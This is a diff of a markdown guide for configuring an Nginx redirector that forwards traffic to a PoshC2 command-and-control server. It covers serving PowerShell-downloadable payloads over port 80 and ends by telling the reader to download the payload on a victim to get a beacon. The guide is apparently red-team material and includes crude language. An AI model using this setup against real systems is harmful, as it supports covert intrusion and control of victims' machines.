@@ -11,50 +11,26 @@
     ```
 4. Paste the follwing in `lp_proxy.conf`
     ```nginx
-    server {
-        listen 80;
-        listen [::]:80;
+server {
+    listen 80;
+    #NOTE: This line is so payloads can be downloaded over port 80 using Powershell
+    server_name <IP of Proxy Server>;
 
-        server_name <serverIP-OR-ServerDNSname>;
-
-        location / {
-            proxy_pass http://<parrot-c2-ip>;
-        }
+    location / {
+        proxy_pass https://<posh-server IP>:<Posh bind port>;
     }
+}
     ```
-4. Now lets add the TCP rules to allow us to handle the beacons
-    ```bash
-    sudo vim /etc/nginx/nginx.conf
-    ```
-5. Paste the following Bellow `http {...}` section
-    ```nginx
-    stream {
-        log_format posh '$remote_addr [$time_local] '
-        '$protocol $status $bytes_sent $bytes_received '
-        '$session_time "$upstream_addr" '
-        '"$upstream_bytes_sent" "$upstream_bytes_received" "$upstream_connect_time"';
-    
-        server {
-            listen 8080;
 
-            proxy_pass <Parrot-IP>:80;
-
-            access_log /var/log/nginx/tcp_access.log posh;
-            error_log /var/log/nginx/tcp_error.log;
-
-        }
-
-    }
-    ```
-6. Now lets reload Nginx with the new config files
+5. Now lets reload Nginx with the new config files
     ```bash 
     sudo systemctl restart nginx.service
     ```
-7. From here, create a poshc2 project with the bind port set to 80, and in `payloadcomshost` set your `http://proxy-ip:80`
+6. From here, create a poshc2 project with the bind port set to 80, and in `payloadcomshost` set your `http://proxy-ip:80`
 
-8. Host your payload however and download on victim 
+7. Host your payload however and download on victim 
 
-9. tada you have a beacon shelley, fuck you.
+8. tada you have a beacon shelley, fuck you.
 
 ## Important Nginx File Locations 
 - `/var/www/html` – Website content as seen by visitors.
